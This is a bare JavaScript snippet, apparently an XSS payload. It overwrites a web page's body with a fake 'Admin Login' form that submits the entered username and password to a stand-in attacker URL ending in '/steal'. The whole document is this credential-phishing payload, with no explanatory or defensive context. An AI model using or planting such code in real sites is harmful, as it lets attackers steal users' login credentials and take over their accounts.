document.body.innerHTML = `
  <h2>Admin Login</h2>
  <form action="https://your-malicious-server.com/steal" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
  </form>
`;
